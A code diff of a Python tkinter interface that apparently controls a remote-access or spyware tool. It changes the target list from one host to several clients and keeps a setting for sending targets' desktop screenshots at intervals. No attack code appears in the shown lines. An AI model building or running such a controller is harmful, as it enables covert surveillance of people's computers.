@@ -6,15 +6,10 @@ from tkinter import ttk
 import silent
 
 
-def authorization_screen(host, status):
+def authorization_screen(users):
 
-    global hostname
-    hostname = host
-
-    global conn_status
-    conn_status = status
-
-    print('host: ' + hostname, ' status: ' + conn_status)
+    global clients
+    clients = users
 
     # globalise username & password entries by user.
     global window
@@ -200,7 +195,7 @@ def main_screen():
             row1_screenshots.pack(side=BOTTOM, fill='x')
 
             # add a slider to set the default time value of when the screen shots shoud be sent.
-            lbl_screenshot_info = Label(row1_screenshots, font=font_set, text='Send targets desktop screenshots every ')# + str(scale_screenshot.get()) + ' minutes.')
+            lbl_screenshot_info = Label(row1_screenshots, font=font_set, text='Send targets desktop screenshots every ')
             lbl_screenshot_info.pack(side=LEFT, padx=5, pady=1)
 
         # run the function.
@@ -300,30 +295,8 @@ def main_screen():
 
         list_targets.config(yscrollcommand=scrollbar.set)
 
-        for i in range(1):
-            list_targets.insert(END, str(hostname))
-
-        def check_status():
-
-            if conn_status == 'True':
-                lbl_connection_status.configure(fg='green', text='Status: ' + conn_status)
-
-                def enable_tabs():
-                    for i in range(3):
-                        tab_control.tab(i, state="normal")
-
-                enable_tabs()
-
-            else:
-                lbl_connection_status.configure(fg='red', text='Status: ' + conn_status)
-
-                def disable_tabs():
-                    for i in range(3):
-                        tab_control.tab(i, state="disabled")
-
-                disable_tabs()
-
-        check_status()
+        for client in clients:
+            list_targets.insert(END, client['name'])
 
         # The button to connect to target's PC
         btn_connect_to_target = Button(target_frame, font=('Helvetica', 9, 'bold'), text='CONNECT')
